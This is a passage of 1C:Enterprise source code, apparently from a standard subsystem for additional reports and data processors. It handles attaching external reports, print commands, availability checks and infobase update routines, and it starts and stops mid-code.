			Команда.ДополнительныеПараметры = Новый Структура(""Вид, ЭтоОтчет"", ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиСозданиеСвязанныхОбъектов(), Ложь);
		КонецЕсли;
	КонецЕсли;
	
КонецПроцедуры

// Добавляет отчеты подсистемы ""Дополнительные отчеты и обработки"",
//   в модулях объектов которых есть процедура ОпределитьНастройкиФормы().
//
// Параметры:
//   ОтчетыСНастройками - Массив - Ссылки отчетов, в модулях объектов которых есть процедура ОпределитьНастройкиФормы().
//
// Места использования:
//   ВариантыОтчетовПовтИсп.Параметры().
//
Процедура ПриОпределенииОтчетовСНастройками(ОтчетыСНастройками) Экспорт
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	Если НЕ ПравоДоступа(""Чтение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки) Тогда
		Возврат;
	КонецЕсли;
	ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса = ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса();
	Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса Тогда
		МодульДополнительныеОтчетыИОбработкиВМоделиСервиса = ОбщегоНазначения.ОбщийМодуль(""ДополнительныеОтчетыИОбработкиВМоделиСервиса"");
	КонецЕсли;
	Запрос = Новый Запрос;
	Запрос.Текст =
	""ВЫБРАТЬ РАЗРЕШЕННЫЕ
	|	ДополнительныеОтчетыИОбработки.Ссылка
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки КАК ДополнительныеОтчетыИОбработки
	|ГДЕ
	|	ДополнительныеОтчетыИОбработки.ИспользуетХранилищеВариантов
	|	И ДополнительныеОтчетыИОбработки.ТеснаяИнтеграцияСФормойОтчета
	|	И НЕ ДополнительныеОтчетыИОбработки.ПометкаУдаления
	|	И ДополнительныеОтчетыИОбработки.Вид В(&ВидыОтчетов)"";
	ВидыОтчетов = Новый Массив;
	ВидыОтчетов.Добавить(Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет);
	ВидыОтчетов.Добавить(Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет);
	Запрос.УстановитьПараметр(""ВидыОтчетов"", ВидыОтчетов);
	УстановитьПривилегированныйРежим(Истина);
	ДопОтчетыСНастройками = Запрос.Выполнить().Выгрузить().ВыгрузитьКолонку(""Ссылка"");
	Для Каждого Ссылка Из ДопОтчетыСНастройками Цикл
		Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса
			И Не МодульДополнительныеОтчетыИОбработкиВМоделиСервиса.ЭтоПоставляемаяОбработка(Ссылка) Тогда
			Продолжить;
		КонецЕсли;
		ОтчетыСНастройками.Добавить(Ссылка);
	КонецЦикла;
КонецПроцедуры

// Получает ссылку дополнительного отчета, если он подключен к хранилищу подсистемы Варианты отчетов.
//
// Параметры:
//   ОтчетИнформация - Структура - См. ВариантыОтчетов.СформироватьИнформациюОбОтчетеПоПолномуИмени().
//
Процедура ПриОпределенииТипаИСсылкиЕслиОтчетДополнительный(ОтчетИнформация) Экспорт
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	Если Не ПравоДоступа(""Чтение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки) Тогда
		Возврат;
	КонецЕсли;
	
	Запрос = Новый Запрос;
	Запрос.Текст =
	""ВЫБРАТЬ РАЗРЕШЕННЫЕ
	|	ДополнительныеОтчетыИОбработки.Ссылка
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки КАК ДополнительныеОтчетыИОбработки
	|ГДЕ
	|	ДополнительныеОтчетыИОбработки.ИмяОбъекта = &ИмяОбъекта
	|	И ДополнительныеОтчетыИОбработки.ПометкаУдаления = ЛОЖЬ
	|	И ДополнительныеОтчетыИОбработки.ИспользуетХранилищеВариантов = ИСТИНА
	|	И ДополнительныеОтчетыИОбработки.Вид В (&ВидДополнительныйОтчет, &ВидОтчет)
	|	И ДополнительныеОтчетыИОбработки.Публикация = &ПубликацияИспользуется"";
	Если ОтчетИнформация.ПоУмолчаниюВсеПодключеныКХранилищу Тогда
		Запрос.Текст = СтрЗаменить(Запрос.Текст, ""И ДополнительныеОтчетыИОбработки.ИспользуетХранилищеВариантов = ИСТИНА"", """");
	КонецЕсли;
	Запрос.УстановитьПараметр(""ИмяОбъекта"", ОтчетИнформация.ОтчетИмя);
	Запрос.УстановитьПараметр(""ВидОтчет"",               Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет);
	Запрос.УстановитьПараметр(""ВидДополнительныйОтчет"", Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет);
	Запрос.УстановитьПараметр(""ПубликацияИспользуется"", Перечисления.ВариантыПубликацииДополнительныхОтчетовИОбработок.Используется);
	
	// Необходим для целостности формируемых данных. Права доступа будут применяться на этапе их использования.
	МассивСсылок = Запрос.Выполнить().Выгрузить().ВыгрузитьКолонку(""Ссылка"");
	ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса = ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса();
	Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса Тогда
		МодульДополнительныеОтчетыИОбработкиВМоделиСервиса = ОбщегоНазначения.ОбщийМодуль(""ДополнительныеОтчетыИОбработкиВМоделиСервиса"");
	КонецЕсли;
	Для Каждого Ссылка Из МассивСсылок Цикл
		Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса
			И Не МодульДополнительныеОтчетыИОбработкиВМоделиСервиса.ЭтоПоставляемаяОбработка(Ссылка) Тогда
			Продолжить;
		КонецЕсли;
		ОтчетИнформация.Отчет = Ссылка;
	КонецЦикла;
	
КонецПроцедуры

// Дополняет массив ссылкам дополнительных отчетов, доступных текущему пользователю.
//
// Параметры:
//   Результат - Массив из <см. Справочники.ВариантыОтчетов.Реквизиты.Отчет> -
//       Ссылки отчетов, доступных текущему пользователю.
//
// Места использования:
//   ВариантыОтчетов.ОтчетыТекущегоПользователя().
//
Процедура ПриДобавленииДополнительныхОтчетовДоступныхТекущемуПользователю(ДоступныеОтчеты) Экспорт
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	Если Не ПравоДоступа(""Чтение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки) Тогда
		Возврат;
	КонецЕсли;
	ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса = ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса();
	Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса Тогда
		МодульДополнительныеОтчетыИОбработкиВМоделиСервиса = ОбщегоНазначения.ОбщийМодуль(""ДополнительныеОтчетыИОбработкиВМоделиСервиса"");
	КонецЕсли;
	
	Запрос = Новый Запрос;
	Запрос.Текст =
	""ВЫБРАТЬ РАЗРЕШЕННЫЕ РАЗЛИЧНЫЕ
	|	ДополнительныеОтчетыИОбработки.Ссылка
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки КАК ДополнительныеОтчетыИОбработки
	|ГДЕ
	|	ДополнительныеОтчетыИОбработки.ИспользуетХранилищеВариантов
	|	И ДополнительныеОтчетыИОбработки.Вид В (&ВидДополнительныйОтчет, &ВидОтчет)
	|	И НЕ ДополнительныеОтчетыИОбработки.Ссылка В (&ДоступныеОтчеты)"";
	
	Запрос.УстановитьПараметр(""ДоступныеОтчеты"", ДоступныеОтчеты);
	Запрос.УстановитьПараметр(""ВидОтчет"",               Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет);
	Запрос.УстановитьПараметр(""ВидДополнительныйОтчет"", Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет);
	
	Выборка = Запрос.Выполнить().Выбрать();
	Пока Выборка.Следующий() Цикл
		Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса
			И Не МодульДополнительныеОтчетыИОбработкиВМоделиСервиса.ЭтоПоставляемаяОбработка(Выборка.Ссылка) Тогда
			Продолжить;
		КонецЕсли;
		ДоступныеОтчеты.Добавить(Выборка.Ссылка);
	КонецЦикла;
	
КонецПроцедуры

// Подключает отчет подсистемы ""Дополнительные отчеты и обработки"".
//   Обработка исключений производится управляющим кодом.
//
// Параметры:
//   Ссылка - СправочникСсылка.ДополнительныеОтчетыИОбработки - Отчет, который необходимо инициализировать.
//   ПараметрыОтчета - Структура - Набор параметров, получаемый в процессе проверки и подключения отчета.
//       См. РассылкаОтчетов.ИнициализироватьОтчет().
//   Результат - Булево, Неопределено - Результат подключения.
//       Истина - Удалось подключить дополнительный отчет.
//       Ложь   - Не удалось подключить дополнительный отчет.
//
// Места использования:
//   ВариантыОтчетов.ПодключитьОтчетОбъект().
//   РассылкаОтчетов.ИнициализироватьОтчет().
//
Процедура ПриПодключенииДопОтчета(Ссылка, ПараметрыОтчета, Результат, ПолучатьМетаданные) Экспорт
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		ПараметрыОтчета.ТекстОшибки = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'Элемент """"%1"""" не подключен, потому что подсистема """"%2"""" отключена в настройках программы.
			|Для включения подсистемы обратитесь к администратору программы.'""),
			""'""+ Строка(Ссылка) +""'"",
			ДополнительныеОтчетыИОбработкиКлиентСервер.НаименованиеПодсистемы(Истина));
		Возврат;
	КонецЕсли;
	
	Вид = ОбщегоНазначения.ЗначениеРеквизитаОбъекта(Ссылка, ""Вид"");
	Если Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет
		ИЛИ Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет Тогда
		
		Попытка
			ПараметрыОтчета.Имя = ПодключитьВнешнююОбработку(Ссылка);
			ПараметрыОтчета.Объект = ВнешниеОтчеты.Создать(ПараметрыОтчета.Имя);
			Если ПолучатьМетаданные Тогда
				ПараметрыОтчета.Метаданные = ПараметрыОтчета.Объект.Метаданные();
			КонецЕсли;
			Результат = Истина;
		Исключение
			ПараметрыОтчета.ТекстОшибки = 
				СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НСтр(""ru = 'При подключении дополнительного отчета """"%1"""" возникла ошибка:'""), Строка(Ссылка))
				+ Символы.ПС + ПодробноеПредставлениеОшибки(ИнформацияОбОшибке());
			Результат = Ложь;
		КонецПопытки;
		
	Иначе
		
		ПараметрыОтчета.ТекстОшибки = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'Элемент %1 не является дополнительным отчетом'""),
			""'""+ Строка(Ссылка) +""'"");
		
		Результат = Ложь;
		
	КонецЕсли;
	
КонецПроцедуры

// Подключает отчет подсистемы ""Дополнительные отчеты и обработки"".
//   Обработка исключений производится управляющим кодом.
//
// Параметры:
//   Контекст - Структура - Набор параметров, получаемый в процессе проверки и подключения отчета.
//       См. ВариантыОтчетов.ПриПодключенииОтчета().
//
// Места использования:
//   ВариантыОтчетов.ПриПодключенииОтчета().
//
Процедура ПриПодключенииОтчета(Контекст) Экспорт
	Ссылка = ОбщегоНазначенияКлиентСервер.СвойствоСтруктуры(Контекст, ""Отчет"");
	Если ТипЗнч(Ссылка) <> Тип(""СправочникСсылка.ДополнительныеОтчетыИОбработки"") Тогда
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'В процедуру """"%1"""" не передан отчет'""),
			""ДополнительныеОтчетыИОбработки.ПриПодключенииОтчета"");
	КонецЕсли;
	
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'Функциональная опция """"%2"""" отключена в настройках программы.
			|Обратитесь к администратору программы.'""),
			ДополнительныеОтчетыИОбработкиКлиентСервер.НаименованиеПодсистемы(Истина));
	КонецЕсли;
	
	Вид = ОбщегоНазначения.ЗначениеРеквизитаОбъекта(Ссылка, ""Вид"");
	Если Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет
		Или Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет Тогда
		
		Контекст.ИмяОтчета = ПодключитьВнешнююОбработку(Ссылка);
		Контекст.Подключен = Истина;
		
	Иначе
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'Объект """"%1"""" не является дополнительным отчетом'""), Строка(Ссылка));
	КонецЕсли;
	
КонецПроцедуры

Процедура ПриОпределенииДоступностиОтчетов(СсылкиДопОтчетов, Результат) Экспорт
	ПодсистемаВключена = Истина;
	ЕстьПравоЧтения = Истина;
	МодульДополнительныеОтчетыИОбработкиВМоделиСервиса = Неопределено;
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		ПодсистемаВключена = Ложь;
	ИначеЕсли Не ПравоДоступа(""Чтение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки) Тогда
		ЕстьПравоЧтения = Ложь;
	ИначеЕсли ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса() Тогда
		МодульДополнительныеОтчетыИОбработкиВМоделиСервиса = ОбщегоНазначения.ОбщийМодуль(""ДополнительныеОтчетыИОбработкиВМоделиСервиса"");
	КонецЕсли;
	
	Для Каждого Отчет Из СсылкиДопОтчетов Цикл
		ОтчетДоступенВМоделиСервиса = Истина;
		Если МодульДополнительныеОтчетыИОбработкиВМоделиСервиса <> Неопределено
			И Не МодульДополнительныеОтчетыИОбработкиВМоделиСервиса.ЭтоПоставляемаяОбработка(Отчет) Тогда
			ОтчетДоступенВМоделиСервиса = Ложь;
		КонецЕсли;
		Найденные = Результат.НайтиСтроки(Новый Структура(""Отчет"", Отчет));
		Для Каждого СтрокаТаблицы Из Найденные Цикл
			Если Не ПодсистемаВключена Тогда
				СтрокаТаблицы.Представление = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
					НСтр(""ru = '<Отчет """"%1"""" недоступен, т.к. дополнительные отчеты и обработки отключены в настройках программы.'""),
					СтрокаТаблицы.Представление);
			ИначеЕсли Не ЕстьПравоЧтения Тогда
				СтрокаТаблицы.Представление = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
					НСтр(""ru = '<Отчет """"%1"""" недоступен, т.к. отсутствует право чтения дополнительных отчетов и обработок.'""),
					СтрокаТаблицы.Представление);
			ИначеЕсли Не ОтчетДоступенВМоделиСервиса Тогда
				СтрокаТаблицы.Представление = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
					НСтр(""ru = '<Отчет """"%1"""" недоступен в модели сервиса.'""),
					СтрокаТаблицы.Представление);
			Иначе
				СтрокаТаблицы.Доступен = Истина;
			КонецЕсли;
		КонецЦикла;
	КонецЦикла;
КонецПроцедуры

// Дополняет список команд печати внешними печатными формами.
//
// Параметры:
//   КомандыПечати - ТаблицаЗначений - См. УправлениеПечатью.СоздатьКоллекциюКомандПечати().
//   ИмяОбъекта    - Строка          - Полное имя объекта метаданных, для которого необходимо получить список
//                                     команд печати.
//
// Места использования:
//   УправлениеПечатью.КомандыПечатиФормы().
//
Процедура ПриПолученииКомандПечати(КомандыПечати, ИмяОбъекта) Экспорт
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	Если Не ПравоДоступа(""Чтение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки) Тогда
		Возврат;
	КонецЕсли;
	ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса = ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса();
	Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса Тогда
		МодульДополнительныеОтчетыИОбработкиВМоделиСервиса = ОбщегоНазначения.ОбщийМодуль(""ДополнительныеОтчетыИОбработкиВМоделиСервиса"");
	КонецЕсли;
	
	Запрос = НовыйЗапросПоДоступнымКомандам(Перечисления.ВидыДополнительныхОтчетовИОбработок.ПечатнаяФорма, ИмяОбъекта);
	ТаблицаКоманд = Запрос.Выполнить().Выгрузить();
	
	Если ТаблицаКоманд.Количество() = 0 Тогда
		Возврат;
	КонецЕсли;
	
	Для Каждого СтрокаТаблицы Из ТаблицаКоманд Цикл
		Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса
			И Не МодульДополнительныеОтчетыИОбработкиВМоделиСервиса.ЭтоПоставляемаяОбработка(СтрокаТаблицы.Ссылка) Тогда
			Продолжить;
		КонецЕсли;
		КомандаПечати = КомандыПечати.Добавить();
		
		// Обязательные параметры.
		ЗаполнитьЗначенияСвойств(КомандаПечати, СтрокаТаблицы, ""Идентификатор, Представление"");
		// Параметры, идентифицирующие подсистему.
		КомандаПечати.МенеджерПечати = ""СтандартныеПодсистемы.ДополнительныеОтчетыИОбработки"";
		
		// Дополнительные параметры.
		КомандаПечати.ДополнительныеПараметры = Новый Структура(""Ссылка, Модификатор, ВариантЗапуска, ПоказыватьОповещение"");
		ЗаполнитьЗначенияСвойств(КомандаПечати.ДополнительныеПараметры, СтрокаТаблицы);
	КонецЦикла;
	
КонецПроцедуры

// Заполняет список печатных форм из внешних источников.
//
// Параметры:
//   ВнешниеПечатныеФормы - СписокЗначений - Печатные формы.
//       Значение      - Строка - Идентификатор печатной формы.
//       Представление - Строка - Название печатной формы.
//   ПолноеИмяОбъектаМетаданных - Строка - Полное имя объекта метаданных,
//       для которого требуется получить список печатных форм.
//
// Места использования:
//   УправлениеПечатью.ПриПолученииСпискаВнешнихПечатныхФорм().
//
Процедура ПриПолученииСпискаВнешнихПечатныхФорм(ВнешниеПечатныеФормы, ПолноеИмяОбъектаМетаданных) Экспорт
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	Если НЕ ПравоДоступа(""Чтение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки) Тогда
		Возврат;
	КонецЕсли;
	ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса = ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса();
	Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса Тогда
		МодульДополнительныеОтчетыИОбработкиВМоделиСервиса = ОбщегоНазначения.ОбщийМодуль(""ДополнительныеОтчетыИОбработкиВМоделиСервиса"");
	КонецЕсли;
	
	Запрос = НовыйЗапросПоДоступнымКомандам(Перечисления.ВидыДополнительныхОтчетовИОбработок.ПечатнаяФорма, ПолноеИмяОбъектаМетаданных);
	
	ТаблицаКоманд = Запрос.Выполнить().Выгрузить();
	
	Для Каждого Команда Из ТаблицаКоманд Цикл
		Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса
			И Не МодульДополнительныеОтчетыИОбработкиВМоделиСервиса.ЭтоПоставляемаяОбработка(Команда.Ссылка) Тогда
			Продолжить;
		КонецЕсли;
		Если СтрНайти(Команда.Идентификатор, "","") = 0 Тогда // кроме ""комплектов""
			ВнешниеПечатныеФормы.Добавить(Команда.Идентификатор, Команда.Представление);
		КонецЕсли;
	КонецЦикла;
	
КонецПроцедуры

// Возвращает ссылку на объект внешней печатной формы.
//
// Места использования:
//   УправлениеПечатью.ПриПолученииВнешнейПечатнойФормы().
//
Процедура ПриПолученииВнешнейПечатнойФормы(Идентификатор, ПолноеИмяОбъектаМетаданных, ВнешняяПечатнаяФормаСсылка) Экспорт
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	Если НЕ ПравоДоступа(""Чтение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки) Тогда
		Возврат;
	КонецЕсли;
	
	Запрос = НовыйЗапросПоДоступнымКомандам(Перечисления.ВидыДополнительныхОтчетовИОбработок.ПечатнаяФорма, ПолноеИмяОбъектаМетаданных);
	
	ТаблицаКоманд = Запрос.Выполнить().Выгрузить();
	
	Команда = ТаблицаКоманд.Найти(Идентификатор, ""Идентификатор"");
	Если Команда <> Неопределено Тогда 
		ВнешняяПечатнаяФормаСсылка = Команда.Ссылка;
	КонецЕсли;
	
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Для вызова из обработчиков обновления.

// [2.0.1] Замена имен рабочих мест на ссылки разделов (справочник ИдентификаторыОбъектовМетаданных).
//
// Параметры:
//   ИменаРазделовИИдентификаторы - Соответствие -
//       * Ключ - Строка - Имя рабочего места (команды), которое ранее указывалось в процедурах:
//             ДополнительныеОтчетыИОбработкиПереопределяемый.ПолучитьОбщиеКомандыДополнительныхОбработок();
//             ДополнительныеОтчетыИОбработкиПереопределяемый.ПолучитьОбщиеКомандыДополнительныхОтчетов().
//       * Значение - ОбъектМетаданных: Подсистема - Раздел командного интерфейса (подсистема первого уровня),
//             в котором размещается данное рабочее место (команда).
//
Процедура ЗаменитьИменаРазделовНаИдентификаторы(ИменаРазделовИИдентификаторы) Экспорт
	ИдентификаторРабочегоСтола = ДополнительныеОтчетыИОбработкиКлиентСервер.ИдентификаторРабочегоСтола();
	
	МассивИменРазделов = Новый Массив;
	Для Каждого КлючИЗначение Из ИменаРазделовИИдентификаторы Цикл
		Если КлючИЗначение.Значение = ИдентификаторРабочегоСтола Тогда
			ИменаРазделовИИдентификаторы.Вставить(КлючИЗначение.Ключ, Справочники.ИдентификаторыОбъектовМетаданных.ПустаяСсылка());
		Иначе
			ИменаРазделовИИдентификаторы.Вставить(КлючИЗначение.Ключ, ОбщегоНазначения.ИдентификаторОбъектаМетаданных(КлючИЗначение.Значение));
		КонецЕсли;
		МассивИменРазделов.Добавить(КлючИЗначение.Ключ);
	КонецЦикла;
	
	ТекстЗапроса =
	""ВЫБРАТЬ РАЗЛИЧНЫЕ
	|	ТЧРазделы.Ссылка
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки.Разделы КАК ТЧРазделы
	|ГДЕ
	|	ТЧРазделы.УдалитьИмяРаздела В (&МассивИменРазделов)"";
	
	Запрос = Новый Запрос;
	Запрос.УстановитьПараметр(""МассивИменРазделов"", МассивИменРазделов);
	Запрос.Текст = ТекстЗапроса;
	
	Выборка = Запрос.Выполнить().Выбрать();
	Пока Выборка.Следующий() Цикл
		// Получение экземпляра объекта.
		Объект = Выборка.Ссылка.ПолучитьОбъект();
		
		Для Каждого СтрокаРаздел Из Объект.Разделы Цикл
			ИОМ = ИменаРазделовИИдентификаторы.Получить(СтрокаРаздел.УдалитьИмяРаздела);
			Если ИОМ = Неопределено Тогда
				Продолжить;
			КонецЕсли;
			СтрокаРаздел.Раздел = ИОМ;
			СтрокаРаздел.УдалитьИмяРаздела = """";
		КонецЦикла; 
		
		// Запись объекта
		ОбновлениеИнформационнойБазы.ЗаписатьДанные(Объект);
	КонецЦикла;
КонецПроцедуры

#КонецОбласти

#Область СлужебныеПроцедурыИФункции

////////////////////////////////////////////////////////////////////////////////
// Обновление информационной базы.

// [1.0.7.1] Процедура обновления записей о доступности дополнительных обработок.
Процедура ОбновитьПользовательскиеНастройкиДоступаКОбработкам() Экспорт
	
	ПользователиСДопОбработками = ПользователиСДоступомКДополнительнымОбработкам();
	
	ТекстЗапроса =
	""ВЫБРАТЬ
	|	ДополнительныеОтчетыИОбработки.Ссылка КАК Обработка,
	|	КомандыДополнительныхОтчетовИОбработок.Идентификатор КАК Идентификатор
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки КАК ДополнительныеОтчетыИОбработки
	|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ Справочник.ДополнительныеОтчетыИОбработки.Команды КАК КомандыДополнительныхОтчетовИОбработок
	|		ПО (КомандыДополнительныхОтчетовИОбработок.Ссылка = ДополнительныеОтчетыИОбработки.Ссылка)"";
	
	Запрос = Новый Запрос;
	Запрос.Текст = ТекстЗапроса;
	ОбработкиСКомандами = Запрос.Выполнить().Выгрузить();
	
	ТаблицаЗаписей = Новый ТаблицаЗначений;
	ТаблицаЗаписей.Колонки.Добавить(""Обработка"",     Новый ОписаниеТипов(""СправочникСсылка.ДополнительныеОтчетыИОбработки""));
	ТаблицаЗаписей.Колонки.Добавить(""Идентификатор"", Новый ОписаниеТипов(""Строка""));
	ТаблицаЗаписей.Колонки.Добавить(""Пользователь"",  Новый ОписаниеТипов(""СправочникСсылка.Пользователи""));
	ТаблицаЗаписей.Колонки.Добавить(""Доступно"",      Новый ОписаниеТипов(""Булево""));
	
	Для Каждого ОбработкаКоманда Из ОбработкиСКомандами Цикл
		Для Каждого Пользователь Из ПользователиСДопОбработками Цикл
			НоваяСтрока = ТаблицаЗаписей.Добавить();
			НоваяСтрока.Обработка     = ОбработкаКоманда.Обработка;
			НоваяСтрока.Идентификатор = ОбработкаКоманда.Идентификатор;
			НоваяСтрока.Пользователь  = Пользователь;
			НоваяСтрока.Доступно   = Истина;
		КонецЦикла;
	КонецЦикла;
	
	ТекстЗапроса =
	""ВЫБРАТЬ
	|	ДополнительныеОтчетыИОбработки.Ссылка КАК Обработка,
	|	КомандыДополнительныхОтчетовИОбработок.Идентификатор КАК Идентификатор,
	|	Пользователи.Ссылка КАК Пользователь,
	|	ПользовательскиеНастройкиДоступаКОбработкам.Доступно КАК Доступно
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки КАК ДополнительныеОтчетыИОбработки
	|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ Справочник.ДополнительныеОтчетыИОбработки.Команды КАК КомандыДополнительныхОтчетовИОбработок
	|		ПО (КомандыДополнительныхОтчетовИОбработок.Ссылка = ДополнительныеОтчетыИОбработки.Ссылка)
	|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ РегистрСведений.ПользовательскиеНастройкиДоступаКОбработкам КАК ПользовательскиеНастройкиДоступаКОбработкам
	|		ПО (ПользовательскиеНастройкиДоступаКОбработкам.ДополнительныйОтчетИлиОбработка = ДополнительныеОтчетыИОбработки.Ссылка)
	|			И (ПользовательскиеНастройкиДоступаКОбработкам.ИдентификаторКоманды = КомандыДополнительныхОтчетовИОбработок.Идентификатор)
	|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ Справочник.Пользователи КАК Пользователи
	|		ПО (Пользователи.Ссылка = ПользовательскиеНастройкиДоступаКОбработкам.Пользователь)"";
	
	Запрос = Новый Запрос;
	Запрос.Текст = ТекстЗапроса;
	ИсключенияПерсональногоДоступа = Запрос.Выполнить().Выгрузить();
	
	ПоискСтрок = Новый Структура(""Обработка, Идентификатор, Пользователь"");
	Для Каждого ИсключениеПерсональногоДоступа Из ИсключенияПерсональногоДоступа Цикл
		ЗаполнитьЗначенияСвойств(ПоискСтрок, ИсключениеПерсональногоДоступа);
		Найденные = ТаблицаЗаписей.НайтиСтроки(ПоискСтрок);
		Для Каждого СтрокаТаблицы Из Найденные Цикл
			СтрокаТаблицы.Доступно = НЕ ИсключениеПерсональногоДоступа.Доступно; // Инвертируем исключением доступа.
		КонецЦикла; 
	КонецЦикла;
	
	Для Каждого Пользователь Из ПользователиСДопОбработками Цикл
		НаборЗаписей = РегистрыСведений.ПользовательскиеНастройкиДоступаКОбработкам.СоздатьНаборЗаписей();
		НаборЗаписей.Отбор.Пользователь.Установить(Пользователь);
		ЗаписиПоБыстромуДоступу = ТаблицаЗаписей.НайтиСтроки(Новый Структура(""Пользователь,Доступно"", Пользователь, Истина));
		Для Каждого ЗаписьБыстрогоДоступа Из ЗаписиПоБыстромуДоступу Цикл
			НоваяЗапись = НаборЗаписей.Добавить();
			НоваяЗапись.ДополнительныйОтчетИлиОбработка = ЗаписьБыстрогоДоступа.Обработка;
			НоваяЗапись.ИдентификаторКоманды			= ЗаписьБыстрогоДоступа.Идентификатор;
			НоваяЗапись.Пользователь					= Пользователь;
			НоваяЗапись.Доступно						= Истина;
		КонецЦикла;
		ОбновлениеИнформационнойБазы.ЗаписатьДанные(НаборЗаписей);
	КонецЦикла;
	
КонецПроцедуры

// [2.0.1.4] Заполнение реквизита ""ИмяОбъекта"" (имя, под которыми объект регистрируется в программе).
//   Для объектов с вариантом Публикации ""Используется"" дополнительно проводится 
//   контроль уникальности Имени объекта. В случае нахождения отчетов или обработок 
//   с неуникальными Именами объектов для всех элементов, кроме первого, 
//   вариант Публикации изменяется с ""Используется"" на ""Режим отладки"".
//
Процедура ЗаполнитьИменаОбъектов() Экспорт
	ТекстЗапроса =
	""ВЫБРАТЬ
	|	ДопОтчеты.Ссылка,
	|	ДопОтчеты.ИмяОбъекта,
	|	ДопОтчеты.ХранилищеОбработки,
	|	ВЫБОР
	|		КОГДА ДопОтчеты.Вид В (&ВидыДопОтчетов)
	|			ТОГДА ИСТИНА
	|		ИНАЧЕ ЛОЖЬ
	|	КОНЕЦ КАК ЭтоОтчет,
	|	ВЫБОР
	|		КОГДА ДопОтчеты.Публикация = ЗНАЧЕНИЕ(Перечисление.ВариантыПубликацииДополнительныхОтчетовИОбработок.Используется)
	|			ТОГДА ИСТИНА
	|		ИНАЧЕ ЛОЖЬ
	|	КОНЕЦ КАК Публикуется,
	|	ВЫБОР
	|		КОГДА ДопОтчеты.ИмяОбъекта = """"""""
	|			ТОГДА ИСТИНА
